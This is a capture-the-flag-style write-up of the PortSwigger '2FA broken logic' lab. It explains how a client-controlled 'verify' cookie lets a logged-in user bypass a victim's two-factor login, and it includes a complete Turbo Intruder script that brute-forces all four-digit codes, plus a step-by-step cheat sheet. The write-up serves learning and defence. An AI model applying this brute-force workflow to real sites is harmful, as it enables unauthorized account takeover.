# 🔓 PortSwigger Lab Writeup: 2FA Broken Logic



![Difficulty](https://img.shields.io/badge/difficulty-Practitioner-orange)

![Category](https://img.shields.io/badge/category-Authentication-blue)

![Status](https://img.shields.io/badge/status-Solved-brightgreen)



> **Lab:** [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

> **Category:** Authentication → Multi-Factor Authentication

> **Goal:** Access `carlos`'s account page despite only holding credentials for `wiener:peter`.



---



## 📋 Table of Contents



- [Overview](#-overview)

- [Root Cause](#-root-cause)

- [Tools Used](#-tools-used)

- [Exploitation Walkthrough](#-exploitation-walkthrough)

- [Turbo Intruder Script](#-turbo-intruder-script)

- [Troubleshooting Log](#-troubleshooting-log)

- [Key Takeaways](#-key-takeaways)

- [Cheat Sheet / TL;DR](#-cheat-sheet--tldr)



---



## 🧭 Overview



| | |

|---|---|

| **Our credentials** | `wiener:peter` |


| **Victim** | `carlos` |

| **Vulnerability class** | Broken multi-factor authentication logic |

| **Impact** | Full account takeover, complete 2FA bypass |



---



## 🧠 Root Cause



After the first login stage (username + password) succeeds, the app:



1. Generates a 4-digit 2FA code.

2. Emails it to the account owner.

3. Tracks **which account** the code belongs to via a client-controlled cookie: `verify=<username>`.



The vulnerability: **the server trusts the `verify` value coming from the client** to decide whose 2FA code is being 
checked, instead of binding that decision strictly to the server-side session state.



This means an authenticated attacker can:



1. Swap `verify=wiener` → `verify=carlos` to make the server generate/expect a code *for Carlos*, while still holding 
onto their own valid session.

2. Brute-force the 4-digit code (only 10,000 possibilities — trivially small).

3. Get logged into Carlos's account, having never touched Carlos's real email.




```

┌─────────────┐    verify=carlos     ┌──────────────┐

│  Attacker   │ ───────────────────► │    Server    │

│ (logged in  │                      │ generates 2FA│

│  as wiener) │                      │ code for     │

└─────────────┘                      │  Carlos      │

       │                             └──────────────┘

       │  brute-force mfa-code (0000-9999)

       ▼

┌─────────────────────────┐

│  302 Found →             │

│  /my-account?id=carlos   │

│  Set-Cookie: session=... │

└─────────────────────────┘

```



---



## 🛠 Tools Used



- **Burp Suite** (Proxy / Repeater)

- **Turbo Intruder** extension (chosen over stock Intruder for raw speed — the 2FA code has a short expiry window, and 
Community Edition's Intruder is rate-limited)



---



## 🚀 Exploitation Walkthrough



### 1. Recon the flow

Log in as `wiener:peter` with Burp intercepting. Observe `POST /login2`:

- A `verify` cookie set to `wiener`.

- A `mfa-code` body parameter.



### 2. Log out

Clear the session to start from a clean slate.



### 3. Generate a 2FA code for Carlos

- Send `GET /login2` to **Repeater**.

- Change the `verify` cookie value: `wiener` → `carlos`.

- Send it. The server now generates a temporary 2FA code scoped to Carlos (emailed to him — we don't need it).



### 4. Capture a fresh valid POST request

- Log in again via the browser as `wiener:peter`.

- At the 2FA prompt, submit any wrong code (e.g. `0000`).

- This gives you a `POST /login2` request with a **still-valid session cookie**.



### 5. Brute-force with Turbo Intruder

- Install via `Extensions → BApp Store → Turbo Intruder`.

- Right-click the captured `POST /login2` → `Extensions → Turbo Intruder → Send to Turbo Intruder`.



**Request modifications:**

- Keep `verify=carlos` in the cookie header.

- Change `mfa-code=0000` → `mfa-code=%s`.

- **Delete the `Content-Length` header** — Turbo Intruder recalculates it; a stale fixed value causes the server to 
reject every request with `400 Bad Request`.



### 6. Run the attack, find the winning code

Any response with `status != 200` is your target — it should come back as `302 Found`.



### 7. Ride the session

Right-click the winning row → **Show response in browser**, open the returned link — the browser picks up the new 
`session` cookie automatically and redirects to `/my-account?id=carlos`.



*(Alternative: manually copy the `Set-Cookie: session=...` value from the response and paste it into DevTools → 
Application → Cookies.)*


### 8. Confirm

Visit `/my-account` → **"Congratulations, you solved the lab!"** ✅



---



## 🐍 Turbo Intruder Script



```python

def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,

                            concurrentConnections=5,

                            requestsPerConnection=100,

                            pipeline=False,

                            engine=Engine.BURP   # ← critical for HTTP/2 targets, see below

                            )



    for i in range(0, 10000):

        code = str(i).zfill(4)   # ensures 4-digit format: 0000-9999

        engine.queue(target.req, code)



def handleResponse(req, interesting):

    if req.status != 200:        # the correct code returns 302, not 200

        table.add(req)

```



---



## 🐞 Troubleshooting Log



Real issues hit during this run, in case you run into the same:



| Symptom | Root Cause | Fix |

|---|---|---|

| **Every Turbo Intruder request returns `400`** | Stale `Content-Length` header left over from the original request no 
longer matches the body after `%s` substitution | Delete the `Content-Length` header entirely — let Turbo Intruder 
recompute it |

| **Still `400` after fixing Content-Length** | Target serves over **HTTP/2**; Turbo Intruder's default internal engine 
mishandles the connection | Add `engine=Engine.BURP` to `RequestEngine(...)` so it reuses Burp's own (HTTP/2-capable) 
connection engine |

| **`AttributeError: class Engine has no attribute 'BURP2'`** | Wrong constant name | Use `Engine.BURP`, not `Engine.
BURP2` |

| **Manually retyping the leaked code in the browser fails** | The 2FA code has a short expiry — by the time you type it 
in, it's dead | Don't retype it — use *Show response in browser* on the winning Intruder/Turbo Intruder response, which 
carries the fresh session cookie directly |



---



## 🔑 Key Takeaways



- **Never bind "who's being verified" to a client-supplied value.** The server should resolve identity strictly from its 
own session state, never from a cookie/parameter the client can freely edit.

- **Short numeric 2FA codes are brute-forceable.** 4 digits = 10,000 combinations — trivial without strict rate-limiting/
lockout.

- **Turbo Intruder > stock Intruder for time-sensitive brute-forces**, especially on Burp Community where Intruder is 
throttled.

- **HTTP/2 targets can break Turbo Intruder's default engine.** `engine=Engine.BURP` is the fix — remember this for 
future labs/engagements.

- **Any body edit that changes length needs `Content-Length` handled** (usually by removing the header and letting the 
tool recompute it).



---



## ⚡ Cheat Sheet / TL;DR



```text

1. Login as wiener → note `verify` cookie in POST /login2

2. Logout

3. GET /login2 in Repeater → verify=carlos → Send

4. Login as wiener again → submit wrong 2FA code → capture the POST

5. Send to Turbo Intruder:

     - verify=carlos (cookie)

     - mfa-code=%s (body)

     - remove Content-Length

     - engine=Engine.BURP (if target is HTTP/2)

6. Brute-force 0000–9999

7. Find the response with status != 200 (302)

8. Show response in browser → /my-account → solved ✅

```



---

